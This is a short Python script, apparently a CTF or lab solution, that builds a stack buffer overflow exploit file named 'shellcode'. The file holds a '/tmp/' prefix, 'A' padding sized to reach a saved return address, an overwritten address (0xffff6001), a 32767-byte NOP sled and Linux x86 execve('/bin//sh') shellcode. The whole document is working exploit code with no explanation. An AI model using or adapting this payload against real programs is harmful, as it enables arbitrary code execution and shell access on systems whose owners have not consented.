code = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
f = open("shellcode", "w+")                                                                      
f.write("/tmp/")
f.write("A"*(0x112-5-4))
f.write("\x01\x60\xff\xff")
f.write("\x90"*32767)
f.write(code)                                                                                  
f.close()
